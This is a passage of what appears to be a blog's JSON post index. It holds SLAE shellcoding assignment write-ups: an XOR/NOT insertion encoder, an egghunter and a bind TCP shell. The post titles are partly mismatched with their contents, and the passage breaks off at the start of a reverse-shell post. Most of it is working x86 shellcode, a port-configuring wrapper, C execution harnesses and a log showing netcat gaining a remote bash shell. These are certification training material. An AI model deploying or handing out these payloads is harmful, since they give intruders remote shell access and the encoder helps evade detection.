STDOUT. ECX keeps pointing to the buffer where to write bytes from.This will finally write to the screen what has been opened and read.The following syscalls beyond the already shown are exit syscalls in order to exit the program gracefully. Furthermore, the resting bytes should be the variables.Conclusion (Shellcode #3)This last shellcode will, open, read, write to the screen what was read and finally exit gracefully the program.CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-27812/PA-27812You can find all of the used resources here." }, { "title": "SLAE - Assignment 4 - Custom Insertion Encoder", "url": "/posts/SLAE-Custom-Encoder/", "categories": "SLAE", "tags": "assembly, shellcoding", "date": "2021-01-17 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close look at a Custom Encoder.The fourth assignment from the seven requires the creation of a Custom Encoder, similar to the one shown in the course as the “Insertion Encoder”. This should be written in the Assembly language, and converting such into shellcode. Moreover, it is required that such is tested later on the C format.The EncoderAs for the encoder itself, I have chosen to concanate the three main techniques regarding encoding during the course, therefore, the encoder obeys the following procedure: XORs every opcode of the shellcode by 46. Performs a NOT operation on every opcode of the shellcode. Inserts an additional 0x45 byte for every opcode.Having the knowledge of such course of action allows us to understand that the decoder should follow the exact same process but on reverse: Remove the an additional 0x45 byte for every opcode and restore the encoded shellcode. Perform a NOT operation on every opcode of the shellcode. XOR every opcode of the shellcode by 46.The encoder#!/usr/bin/pythonshellcode = (\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\")encoded = \"\"encoded2 = \"\"print 'Encoded shellcode ...'for x in bytearray(shellcode) : y = ~x^0x46 encoded += '\\\\x' encoded += '%02x' % (y &amp; 0xFF) encoded += '\\\\x%02x' % 0x45 encoded2 += '0x' encoded2 += '%02x,' % (y &amp; 0xFF) encoded2 += '0x%02x,' % 0x45print '\"' + encoded + '\"'print encoded2print 'Len: %d' % len(bytearray(shellcode))Let’s encode the shellcode:whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$ python custom_encoder.py Encoded shellcode ...\"\\x88\\x45\\x79\\x45\\xe9\\x45\\xd1\\x45\\x96\\x45\\x96\\x45\\xca\\x45\\xd1\\x45\\xd1\\x45\\x96\\x45\\xdb\\x45\\xd0\\x45\\xd7\\x45\\x30\\x45\\x5a\\x45\\xe9\\x45\\x30\\x45\\x5b\\x45\\x09\\x45\\xb2\\x45\\x74\\x45\\x39\\x45\"0x88,0x45,0x79,0x45,0xe9,0x45,0xd1,0x45,0x96,0x45,0x96,0x45,0xca,0x45,0xd1,0x45,0xd1,0x45,0x96,0x45,0xdb,0x45,0xd0,0x45,0xd7,0x45,0x30,0x45,0x5a,0x45,0xe9,0x45,0x30,0x45,0x5b,0x45,0x09,0x45,0xb2,0x45,0x74,0x45,0x39,0x45,Len: 22whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$Good, let’s create the skeleton code:global _startsection .text_start: jmp short master ; Jumps to mastermain: pop ebp ; Pops the value of the shellcode into ebp mov esi, ebp ; Copies the value from ebp to esimaster: call main ; Calls to main and pops shellcode into the stack shellcode: db 0x88,0x45,0x79,0x45,0xe9,0x45,0xd1,0x45,0x96,0x45,0x96,0x45,0xca,0x45,0xd1,0x45,0xd1,0x45,0x96,0x45,0xdb,0x45,0xd0,0x45,0xd7,0x45,0x30,0x45,0x5a,0x45,0xe9,0x45,0x30,0x45,0x5b,0x45,0x09,0x45,0xb2,0x45,0x74,0x45,0x39,0x45Right now, the flow jumps to the master section and calls main, pushing the value of shellcode into the stack and popping into EBP. Furthermore, this value is copied into ESI, this will be essential when it comes to the following sections of XORing and NOT decoding the instructions, as the ESI value will have to be zeroed, therefore, EBP being a backup register.Now, the following steps are the same as when it comes to any insertion decoder: Point EDI to the additional bytes. Start a counter for the loop. (44 bytes in our case) Point BL to the additional bytes. XOR BL by the additional bytes. Point BL to the following byte, which should be the intended. Copy the value of BL into EDI, slowly restoring the original order. Increment EDI in order to repeat the process. AL is incremented by 2, once again to repeat the process. Start the loop. lea edi, [esi + 1] ; Points to the 0x45 byte xor eax, eax ; Zeroes out EAX xor ebx, ebx ; Zeroes out EBX mov cl, 44 ; Stores counter (44 bytes) mov al, 1 ; Makes AL hold value 1 for later calculations. decode: mov bl, byte [esi + eax] ; Points to 0x45 xor bl, 0x45 ; Turns 0x45 into 0x00 mov bl, byte [esi + eax + 1] ; Grabs intended value mov byte [edi], bl ; Replaces 0x00 for the intended value inc edi ; Increments EDI, holding next 0x45 for replacement add al, 2 ; Adds 2 in order to continue the process loop decode ; Starts loopGreat! By now our shellcode should have the additional 0x45 bytes removed, the following step is to clean ESI and restore its value by copying the EBP register’s one! Furthermore, it is left for use to set the counter once again! This time to the half of the shellcode, as the additional bytes have been removed. mov cl, 22 ; Stores counter (22 bytes) xor esi, esi ; Zeroes out ESI mov esi, ebp ; Copies the value from ebp to esiThe next step should be executing the NOT operation. And once again, clean the value of ESI and restore its value!The procedure of the NOT operation should be the pollowing: Perform a NOT operation on the value of ESI. Increment ESI, pointing to the next byte. Continue the loop.decode2: not byte [esi] ; Performs a NOT operation on the value pointed by ESI inc esi ; Increments ESI, therefore performing a NOT operation on every opcode loop decode2 ; Starts loop mov cl, 22 ; Stores counter (22 bytes) xor esi, esi ; Zeroes out ESI mov esi, ebp ; Copies the value from ebp to esiFinally, at last we have to XOR the remaining part of the shellcode by 0x46.The procedure of the XOR operation should be the pollowing: Perform a XOR operation with 0x46 on the value of ESI. Increment ESI, pointing to the next byte. Continue the loop. Once this is finished, jump to the fully decoded shellcode.decode3: xor byte [esi], 0x46 ; Performs a XOR operation between the value of ESI and 0x46 inc esi ; Increments ESI, therefore performing aXOR operation on every opcode loop decode3 ; Starts loop jmp short shellcode ; Jumps to the shellcodeLet’s test this encoder within the C format:#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char code[] = \\\"\\xeb\\x38\\x5d\\x89\\xee\\x8d\\x7e\\x01\\x31\\xc0\\x31\\xdb\\xb1\\x2c\\xb0\\x01\\x8a\\x1c\\x06\\x80\\xf3\\x45\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xe2\\xef\\xb1\\x16\\x31\\xf6\\x89\\xee\\xf6\\x16\\x46\\xe2\\xfb\\xb1\\x16\\x31\\xf6\\x89\\xee\\x80\\x36\\x46\\x46\\xe2\\xfa\\xeb\\x05\\xe8\\xc3\\xff\\xff\\xff\\x88\\x45\\x79\\x45\\xe9\\x45\\xd1\\x45\\x96\\x45\\x96\\x45\\xca\\x45\\xd1\\x45\\xd1\\x45\\x96\\x45\\xdb\\x45\\xd0\\x45\\xd7\\x45\\x30\\x45\\x5a\\x45\\xe9\\x45\\x30\\x45\\x5b\\x45\\x09\\x45\\xb2\\x45\\x74\\x45\\x39\\x45\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGamewhitecr0wz@SLAE:~/assembly/assignments/Assignment_4$ gcc custom_insertion.c -o custom_insertion -fno-stack-protector -z execstack -w whitecr0wz@SLAE:~/assembly/assignments/Assignment_4$ ./custom_insertion Shellcode Length: 107$Complete code:global _startsection .text_start: jmp short master ; Jumps to mastermain: pop ebp ; Pops the value of the shellcode into ebp mov esi, ebp ; Copies the value from ebp to esi lea edi, [esi + 1] ; Points to the 0x45 byte xor eax, eax ; Zeroes out EAX xor ebx, ebx ; Zeroes out EBX mov cl, 44 ; Stores counter (44 bytes) mov al, 1 ; Makes AL hold value 1 for later calculations.decode: mov bl, byte [esi + eax] ; Points to 0x45 xor bl, 0x45 ; Turns 0x45 into 0x00 mov bl, byte [esi + eax + 1] ; Grabs intended value mov byte [edi], bl ; Replaces 0x00 for the intended value inc edi ; Increments EDI, holding next 0xAA for replacement add al, 2 ; Adds 2 in order to continue the process loop decode ; Starts loop mov cl, 22 ; Stores counter (22 bytes) xor esi, esi ; Zeroes out ESI mov esi, ebp ; Copies the value from ebp to esidecode2: not byte [esi] ; Performs a NOT operation on the value pointed by ESI inc esi ; Increments ESI, therefore performing a NOT operation on every opcode loop decode2 ; Starts loop mov cl, 22 ; Stores counter (22 bytes) xor esi, esi ; Zeroes out ESI mov esi, ebp ; Copies the value from ebp to esidecode3: xor byte [esi], 0x46 ; Performs a XOR operation between the value of ESI and 0x46 inc esi ; Increments ESI, therefore performing aXOR operation on every opcode loop decode3 ; Starts loop jmp short shellcode ; Jumps to the shellcodemaster: call main ; Calls to main and pops shellcode into the stack shellcode: db 0x88,0x45,0x79,0x45,0xe9,0x45,0xd1,0x45,0x96,0x45,0x96,0x45,0xca,0x45,0xd1,0x45,0xd1,0x45,0x96,0x45,0xdb,0x45,0xd0,0x45,0xd7,0x45,0x30,0x45,0x5a,0x45,0xe9,0x45,0x30,0x45,0x5b,0x45,0x09,0x45,0xb2,0x45,0x74,0x45,0x39,0x45CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE - Assignment 3 - Egghunter", "url": "/posts/SLAE-Egghunter/", "categories": "SLAE", "tags": "assembly, shellcoding", "date": "2021-01-16 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close look at Egghunters.An Egghunter is a form of malware, commonly used during Exploit-Development sessions in order to process bigger shellcode when there is low space available. The process is quite simple, this will search for a specific tag within the memory. When found, the flow will be passed upon the instructions following the tag, executing the original shellcode.The third assignment from the seven requires the creation of an Egghunter through the Assembly language, and converting such into shellcode. Moreover, it is required to test such.MethodsIn order to create an Egghunter shellcode, there are several paths. However, as the time goes on, newer techniques are implemented that make shellcoding easier. I have chosen to cover a modern method which is fast, and tends to be very small regarding size. This method obeys the following procedure: The tag is saved on ESI EBX is incremented The value of EBX is compared with ESI. If positive, this should set the Zero Flag (ZF) Repeat this process through a jump if not zero (JNZ) condition. Jump into EBX.It is quite important to note that the tag does not contain an opocode that could interfere with our egghunter, such as an INC ESI (46), or DEC EBX (4B). The chosen tag is 45474547 (GEGE).Code:global _start_start: mov esi, 0x45474547 ; Moves the tag GEGE into ESImain: inc ebx ; Increments EBX for comparison. cmp dword [ebx], esi ; Compares EBX with ESI, that contains the tag. If they contain the same value, set the Zero flag (ZF). jne main ; Jumps to main to repeat the loop until the Zero flag (ZF) is set. push ebx ; Pushes the value of EBX into the stack. ret ; Pops it into the EIP.Let’s test this egghunter within the C format:#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char egg[] = \\\"\\xbe\\x47\\x45\\x47\\x45\\x43\\x39\\x33\\x75\\xfb\\x53\\xc3\";unsigned char code[] = \\\"\\x47\\x45\\x47\\x45\"\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\";main(){ printf(\"Shellcode size: %d\\n\", strlen(code)); printf(\"Egg size: %d\\n\", strlen(egg)); int (*ret)() = (int(*)())egg; ret();}EndGamewhitecr0wz@SLAE:~/assembly/assignments/Assignment_3$ gcc egghunter.c -o egghunter -fno-stack-protector -z execstack -w whitecr0wz@SLAE:~/assembly/assignments/Assignment_3$ ./egghunter Shellcode size: 26Egg size: 12$Furthermore, there is an additional detail that the egghunter should be configurable for different payloads. As the only requirement is to leave the tag at the start of the payload, configuration for different shellcodes should be easy.Let’s test this egghunter within the C format once again. I will now use the bind shell developed during this post.#include&lt;stdio.h&gt;#include&lt;string.h&gt;unsigned char egg[] = \\\"\\xbe\\x47\\x45\\x47\\x45\\x43\\x39\\x33\\x75\\xfb\\x53\\xc3\";unsigned char code[] = \\\"\\x47\\x45\\x47\\x45\"\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\x68\\x67\\x01\\x66\\x58\\xb3\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x69\\x01\\x66\\x58\\x89\\xf3\\x52\\x52\\x66\\x68\\x23\\x28\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x66\\x68\\x6b\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x51\\xcd\\x80\\x66\\x68\\x6c\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x66\\x6a\\x3f\\x66\\x58\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\x75\\xf3\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80\";main(){ printf(\"Shellcode size: %d\\n\", strlen(code)); printf(\"Egg size: %d\\n\", strlen(egg)); int (*ret)() = (int(*)())egg; ret();}EndGame #2whitecr0wz@SLAE:~/assembly/assignments/Assignment_3$ gcc egghunter.c -o egghunter -fno-stack-protector -z execstack -w whitecr0wz@SLAE:~/assembly/assignments/Assignment_3$ ./egghunter Shellcode size: 131Egg size: 12─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────root@whitecr0wz:~# rlwrap nc 192.168.100.200 9000 -v 192.168.100.200: inverse host lookup failed: Unknown host(UNKNOWN) [192.168.100.200] 9000 (?) openpython3 -c 'import pty;pty.spawn(\"/bin/bash\")'whitecr0wz@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_3$ id &amp;&amp; whoami &lt;wz/assembly/assignments/Assignment_3$ id &amp;&amp; whoami uid=1001(whitecr0wz) gid=1001(whitecr0wz) groups=1001(whitecr0wz)whitecr0wzwhitecr0wz@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_3$CodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE - Assignment 2 - Reverse TCP Shellcode", "url": "/posts/SLAE-Bind/", "categories": "SLAE", "tags": "assembly, shellcoding", "date": "2021-01-15 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close look at Linux Bind Shells.A Bind shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Reverse Shell, binding to a local port of the compromised system, instead of arranging a specific connection on a trivial address.The first assignment from the seven requires the creation of a Bind Shell through the Assembly language, and converting such into shellcode. Moreover, it is required to write a wrapper in any language of preference that is capable of easily configuring the port.TheoryIn order to create a Bind Shell, 6 main functions are required: Socket Bind Listen Accept Dup2 Execve Time to stick our hands into the mudThe first thing required is to clean the registers, as when we execute our program, it will work as a charm, however, when introduced into a real program within a context of binary exploitation with different variables that alter the registers, it may not. Due to this, it’s better to have a set of instructions that clean the registers that will be employed:global _startsection .text_start: xor eax, eax ; Zeroes out EAX. xor ebx, ebx ; Zeroes out EBX. xor ecx, ecx ; Zeroes out ECX. xor edx, edx ; Zeroes out EDX. xor esi, esi ; Zeroes out ESI.SocketCreates an endpoint for communicationOur next step is to initialize the socket. In order to concrete such action, it is required to move the value of the socket (359) syscall into eax. I have chosen to push the value as a word into the ax register, in order to avoid null characters. Furthermore, according to the syscall man page for socket, the required flags involve domain (EBX), type (ECX) and protocol (EDX). A common combination when it comes to remote shells is AF_INET, SOCK_STREAM. According to this file, the value of AF_INET is 2 and SOCK_STREAM 1, therefore, this will be reflected on the EBX and ECX registers. Finally, the value of protocol (EDX) isn’t actually very relevant. Due to this, EDX is simply pushed.socket: push word 359 ; Pushes word 359 (socket) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov bl, 2 ; Moves value 2 into bl, giving the value AF_INET. mov cl, 1 ; Moves value 1 into bl, giving the value SOCK_STREAM. push edx ; There isn't anything really needed within this parameter, so 0 is pushed from EDX. int 0x80 ; Call to kernel. mov esi, eax ; Saves the value of eax for sockfd values later on.As you can see, the value of EAX has been copied to ESI, this will be very useful as storage of the file descriptor value from socket for later operations.BindBinds a name to a socketThe next step is to concrete the Bind function. The process is quite similar to socket, the value of the syscall in /usr/include/x86_64-linux-gnu/asm/unistd_32.h is 361.According to the manpage, the arguments are int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);. As aforementioned, ESI will be used to satisfy the sockfd argument. Furthermore, in order to satisfy the struct, it is required to push the following values: 0 (As it is required to push 0, the instruction PUSH EDX will be used.) IP Address (As this is a bind shell, it is required to listen in all interfaces. Therefore, this will be set to 0 through pushing EDX.) Chosen Port (The chosen port will be pushed in hex as a word.) AF_INETFinally, it is regarding to point out in EDX the length of such struct, which is 16.bind: push word 361 ; Pushes word 361 (bind) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. push edx ; As the following parameter is a const struct sockaddr, and this is a bind shell, the first values aren't actually required, therefore, zeroes are ; pushed through EDX. push edx ; The same as stated above. push word 0x2823 ; Pushes the word 9000 into the stack. push word 0x02 ; Pushes AF_INET into the stack. mov ecx, esp ; Copies the value of ESP into ECX. mov dl, 16 ; The value 16 is inserted into DL, as this argument requires the length of the struct. int 0x80 ; Call to kernel.ListenListens for connections on a socketTime to set the listen syscall. This is starting to come together, isn’t it? According to the manpage for such syscall the arguments are the following:int listen(int sockfd, int backlog);This is quite easy to concrete. As in the previous snippets, the value of ESI will be copied into EBX in order to point to the socket file descriptor. Moreover, as the backlog isn’t crucial (defines the maximum length to which the queue of pending connections for sockfd may grow) it will simply be set to 0.listen: push word 363 ; Pushes word 363 (listen) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. xor ecx, ecx ; Zeroes ECX out. push ecx ; Pushes ECX (0), as the backlog isn't really important. int 0x80 ; Call to kernel.AcceptAccepts a connection on a socketInterestingly enough, there is no syscall in /usr/include/x86_64-linux-gnu/asm/unistd_32.h for accept. However, accept4 (364) exists, which grants a similar functionality. Moreover, if the arguments are satisfied with 0, the syscall will act as accept.Snippet from the manpage:If flags is 0, then accept4() is the same as accept().Arguments for accept4:int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);accept4: push word 364 ; Pushes word 364 (accept4) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. xor ecx, ecx ; As there is no syscall for accept, accept4 grants the possibility of a conversion from accept4 to accept if the values are satisfied with 0. xor edx, edx ; Due to this event, the following registers will be set to 0 to cause such circumstance. xor esi, esi ; The same as stated above. int 0x80 ; Call to kernel. mov esi, eax ; Saves the value of eax for sockfd values later on.As you can see, ESI is once again saving the value of EAX, exactly as when we started. This is due to the fact that now the file descriptor for socket is no longer required. And now it is important to use the accept() file descriptor for the next syscalls.Dup2Duplicate a file descriptorWe now may have a bind shell. However, this is completely useless if it isn’t functional, right? This is where dup2 comes in, our little friend will iterate 3 times in order to copy into our accepted connection the STDIN (0), STDOUT (1), and STDERR (2) file descriptors, therefore making the shell interactive. There are two ways to perform this task, either copying and writing three times or performing a loop. The latter sounds more fun, right? ECX will be used with a JNZ (jump if the zero flag (ZF) is not set) instruction as well, performing a loop which will not stop until ECX reaches to zero through a dec cl instruction. mov cl, 3 ; Starts counter for dup2 dup2: push word 63 ; Pushes word 63 (dup2) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the accept syscall. dec cl ; Decrements cl in order to set the zero flag (ZF) int 0x80 ; Call to kernel jnz dup2 ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.ExecveExecute programThis may be the last syscall to be initialized, yet it is the most important, no shell, no access! The process is quite simple, a group of three dwords containing the string////bin/bash will be copied into ebx through PUSH and MOV instructions. Moreover, the value of EDX will be set to 0, as envp is not required. Finally, as ECX needs to point to the string, EBX will be pushed into the stack, therefore ECX copying its value through a MOV instruction.execve: xor eax, eax ; Zeroes out EAX push eax ; Pushes EAX (0x00000000) PUSH 0x68736162 ; hsab PUSH 0x2f6e6962 ; /nib PUSH 0x2f2f2f2f ; //// mov ebx, esp ; Copies the pushed instructions into EBX. push eax ; Pushes EAX (0x00000000) mov edx, esp ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0 push ebx ; Pushes ////bin/bash into the stack mov ecx, esp ; Copies such value to ECX push word 11 ; Pushes word 11 (execve) into the stack. pop ax ; Pops such word into ax so there are no nulls. int 0x80 ; Calls to kernelFinal code:global _startsection .text_start: xor eax, eax ; Zeroes out EAX. xor ebx, ebx ; Zeroes out EBX. xor ecx, ecx ; Zeroes out ECX. xor edx, edx ; Zeroes out EDX. xor esi, esi ; Zeroes out ESI.socket: push word 359 ; Pushes word 359 (socket) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov bl, 2 ; Moves value 2 into bl, giving the value AF_INET. mov cl, 1 ; Moves value 1 into bl, giving the value SOCK_STREAM. push edx ; There isn't anything really needed within this parameter, so 0 is pushed from EDX. int 0x80 ; Call to kernel. mov esi, eax ; Saves the value of eax for sockfd values later on.bind: push word 361 ; Pushes word 361 (bind) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. push edx ; As the following parameter is a const struct sockaddr, and this is a bind shell, the first values aren't actually required, therefore, zeroes are ; pushed through EDX. push edx ; The same as stated above. push word 0x2823 ; Pushes the word 9000 into the stack. push word 0x02 ; Pushes AF_INET into the stack. mov ecx, esp ; Copies the value of ESP into ECX. mov dl, 16 ; The value 16 is inserted into DL, as this argument requires the length of the struct. int 0x80 ; Call to kernel.listen: push word 363 ; Pushes word 363 (listen) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. xor ecx, ecx ; Zeroes ECX out. push ecx ; Pushes ECX (0), as the backlog isn't really important. int 0x80 ; Call to kernel.accept4: push word 364 ; Pushes word 364 (accept4) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall. xor ecx, ecx ; As there is no syscall for accept, accept4 grants the possibility of a conversion from accept4 to accept if the values are satisfied with 0. xor edx, edx ; Due to this event, the following registers will be set to 0 to cause such circumstance. xor esi, esi ; The same as stated above. int 0x80 ; Call to kernel. mov esi, eax ; Saves the value of eax for sockfd values later on. mov cl, 3 ; Starts counter for dup2dup2: push word 63 ; Pushes word 63 (dup2) into the stack. pop ax ; Pops such word into ax so there are no nulls. mov ebx, esi ; Copies the value from ESI to EBX, granting EBX the sockfd value from the accept syscall. dec cl ; Decrements cl in order to set the zero flag (ZF) int 0x80 ; Call to kernel jnz dup2 ; Jump if the zero flag (ZF) is not set, this will continue the loop 3 times.execve: xor eax, eax ; Zeroes out EAX push eax ; Pushes EAX (0x00000000) PUSH 0x68736162 ; hsab PUSH 0x2f6e6962 ; /nib PUSH 0x2f2f2f2f ; //// mov ebx, esp ; Copies the pushed instructions into EBX. push eax ; Pushes EAX (0x00000000) mov edx, esp ; Copies the value of ESP (0x00000000) into EDX, giving envp[] a value of 0 push ebx ; Pushes ////bin/bash into the stack mov ecx, esp ; Copies such value to ECX push word 11 ; Pushes word 11 (execve) into the stack. pop ax ; Pops such word into ax so there are no nulls. int 0x80 ; Calls to kernelLet’s assemble and link the file!The WrapperAs stated in the introduction, one additional detail given in the assignment is to create a wrapper (in any language) that easily configures the port for the bind shell.Wrapper code:import socket, sys, structif len(sys.argv) != 2: print \"[*] Example: /usr/bin/python wrapper.py &lt;port&gt;\" sys.exit(1)port = sys.argv[1]port = int(port)port = socket.htons(port)hexport = hex(port)hexport = struct.pack(\"&lt;H\", port).encode(\"hex\")final_port = \"\\\\x\"+\"\\\\x\".join(a+b for a,b in zip(hexport[::2],hexport[1::2]))buf = (\"\\\\x31\\\\xc0\\\\x31\\\\xdb\\\\x31\\\\xc9\\\\x31\\\\xd2\\\\x31\\\\xf6\\\\x66\\\\x68\\\\x67\\\\x01\\\\x66\\\\x58\\\\xb3\\\\x02\\\\xb1\\\\x01\\\\x52\\\\xcd\\\\x80\\\\x89\\\\xc6\\\\x66\\\\x68\\\\x69\\\\x01\\\\x66\"\"\\\\x58\\\\x89\\\\xf3\\\\x52\\\\x52\\\\x66\\\\x68\"+ final_port +\"\\\\x66\\\\x6a\\\\x02\\\\x89\\\\xe1\\\\xb2\"\"\\\\x10\\\\xcd\\\\x80\\\\x66\\\\x68\\\\x6b\\\\x01\\\\x66\\\\x58\\\\x89\\\\xf3\\\\x31\\\\xc9\\\\x51\\\\xcd\"\"\\\\x80\\\\x66\\\\x68\\\\x6c\\\\x01\\\\x66\\\\x58\\\\x89\\\\xf3\\\\x31\\\\xc9\\\\x31\\\\xd2\\\\x31\\\\xf6\"\"\\\\xcd\\\\x80\\\\x89\\\\xc6\\\\xb1\\\\x03\\\\x66\\\\x6a\\\\x3f\\\\x66\\\\x58\\\\x89\\\\xf3\\\\xfe\\\\xc9\"\"\\\\xcd\\\\x80\\\\x75\\\\xf3\\\\x31\\\\xc0\\\\x50\\\\x68\\\\x62\\\\x61\\\\x73\\\\x68\\\\x68\\\\x62\\\\x69\"\"\\\\x6e\\\\x2f\\\\x68\\\\x2f\\\\x2f\\\\x2f\\\\x2f\\\\x89\\\\xe3\\\\x50\\\\x89\\\\xe2\\\\x53\\\\x89\\\\xe1\"\"\\\\x66\\\\x6a\\\\x0b\\\\x66\\\\x58\\\\xcd\\\\x80\")print '\"' + (buf) + '\"'Executing the wrapper:whitecr0wz@SLAE:~/assembly/assignments/assignment_1$ python wrapper.py 57326 \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\x68\\x67\\x01\\x66\\x58\\xb3\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x69\\x01\\x66\\x58\\x89\\xf3\\x52\\x52\\x66\\x68\\xdf\\xee\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x66\\x68\\x6b\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x51\\xcd\\x80\\x66\\x68\\x6c\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x66\\x6a\\x3f\\x66\\x58\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\x75\\xf3\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80\"whitecr0wz@SLAE:~/assembly/assignments/assignment_1$Let’s test this on a C file to make sure that the shellcode could work on a real environment:cat bind.c #include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char code[] = \\\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\x68\\x67\\x01\\x66\\x58\\xb3\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x69\\x01\\x66\\x58\\x89\\xf3\\x52\\x52\\x66\\x68\\xdf\\xee\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x66\\x68\\x6b\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x51\\xcd\\x80\\x66\\x68\\x6c\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x66\\x6a\\x3f\\x66\\x58\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\x75\\xf3\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80\";main(){ printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret();}EndGameCodeThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/Student ID: SLAE-27812/PA-27812You can find all of the used resources within this post here." }, { "title": "SLAE - Assignment 1 - Bind TCP Shellcode", "url": "/posts/SLAE-Reverse/", "categories": "SLAE", "tags": "assembly, shellcoding", "date": "2021-01-14 05:44:00 +0000", "snippet": "IntroductionThese series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification. Today we are going to have a close look at Linux Reverse Shells.A Reverse shell is a form of malware which grants remote access to a system through a shell. However, it differentiates from its peer the Bind shell, arranging a specific connection on a trivial address, instead of binding to a local port of the compromised system.The second assignment from the seven requires the creation of a Reverse Shell through the Assembly language, and converting such into shellcode. Moreover, it is required to write a wrapper in any language of preference that is capable of easily configuring the address and port.If you were able to follow the previous post with ease, this should be a charm!TheoryIn order to create a Reverse Shell, 4 main functions are required: Socket Connect Dup2 Execve Time to stick our hands into the mudThe 